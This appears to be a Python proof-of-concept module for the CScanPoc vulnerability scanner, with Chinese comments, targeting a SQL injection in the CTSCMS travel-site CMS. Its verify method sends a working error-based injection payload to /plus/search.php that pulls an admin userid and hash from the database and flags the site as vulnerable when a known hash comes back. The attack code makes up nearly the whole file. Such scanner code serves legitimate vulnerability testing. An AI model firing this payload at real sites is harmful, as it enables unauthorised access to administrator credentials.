# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'CTSCMS_0007'  # 平台漏洞编号，留空
    name = 'CTSCMS SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2013-05-03'  # 漏洞公布时间
    desc = '''
        中国旅游服务网站管理系统(CTSCMS.COM)是专业的旅游网站程序源码、旅游网站系统、旅游网站模板、旅游网站建设服务提供商,专注于旅游电子商务发展的服务于旅行社和旅游。
        /plus/search.php?keyword=as SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/546/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'CTSCMS'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'b0da5747-8904-4c1c-8cf4-eccc90f202c4'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-12'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = "/plus/search.php?keyword=as&typeArr[111%3D@`\'`)+and+(SELECT+1+FROM+(select+count(*),concat(floor(rand(0)*2),(substring((select+CONCAT(0x7c,userid,0x7c,md5(c))+from+`%23@__admin`+limit+0,1),1,62)))a+from+information_schema.tables+group+by+a)b)%23@`\'`+]=a"
            url = self.target + payload
            r = requests.get(url)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
